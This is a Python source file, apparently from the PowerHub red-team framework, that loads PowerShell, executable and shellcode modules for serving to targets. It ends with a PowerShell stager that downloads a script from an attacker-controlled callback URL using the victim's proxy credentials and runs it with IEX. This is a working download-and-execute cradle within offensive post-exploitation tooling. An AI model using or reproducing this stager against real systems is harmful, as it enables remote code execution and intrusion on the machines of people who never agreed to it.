from powerhub.args import args
import os
import base64

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def load_powershell_scripts(directory):
    result = []
    for dirName, subdirList, fileList in os.walk(directory):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            # remove tests from powersploit
            if "tests" not in fname and fname.endswith('ps1'):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(os.path.join(BASE_DIR, 'modules'), ''),
                    "ps1",
                    #  base64.b64encode(d),
                    d,
                ))
    return result


def load_exe_files(directory):
    result = []
    for dirName, subdirList, fileList in os.walk(directory):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            if fname.endswith('exe'):
                with open(filename, "br") as f:
                    d = f.read()
                result.append(Module(
                    filename.replace(BASE_DIR, ''),
                    "exe",
                    #  base64.b64encode(d),
                    d,
                ))
    return result


def load_shellcode_files(directory):
    result = []
    for dirName, subdirList, fileList in os.walk(directory):
        for fname in fileList:
            filename = os.path.join(dirName, fname)
            with open(filename, "br") as f:
                d = f.read()
            result.append(Module(
                filename.replace(BASE_DIR, ''),
                "shellcode",
                #  base64.b64encode(d),
                d,
            ))
    return result


def ensure_dir_exists(dirname):
    if not os.path.exists(dirname):
        os.makedirs(dirname)


def import_modules():
    mod_dir = os.path.join(
        BASE_DIR,
        'modules',
    )

    ensure_dir_exists(mod_dir)
    ensure_dir_exists(os.path.join(mod_dir, 'ps1'))
    ensure_dir_exists(os.path.join(mod_dir, 'exe'))

    ps_modules = load_powershell_scripts(os.path.join(mod_dir, 'ps1'))
    exe_modules = load_exe_files(os.path.join(mod_dir, 'exe'))
    shellcode_modules = load_shellcode_files(os.path.join(
        mod_dir,
        'shellcode'
    ))
    result = ps_modules + exe_modules + shellcode_modules
    for i, m in enumerate(result):
        m.n = i

    return result


class Module(object):
    def __init__(self, name, type, code):
        self.name = name
        self.type = type
        self._code = code
        self.code = ""
        self.active = False
        self.n = -1

    def activate(self):
        self.active = True
        self.code = self._code

    def deactivate(self):
        self.active = False
        self.code = ""


modules = import_modules()

callback_url = '%s://%s:%d/%s' % (
    args.PROTOCOL,
    args.URI_HOST,
    args.URI_PORT,
    args.URI_PATH,
)


stager_str = (
    #  "[System.Net.ServicePointManager]::ServerCertificateValidationCallback #  = {$true};" if args.SSL else "" # noqa
    "$K=new-object net.webclient;"
    "$K.proxy=[Net.WebRequest]::GetSystemWebProxy();"
    "$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
    "IEX $K.downloadstring('%s');"
) % callback_url
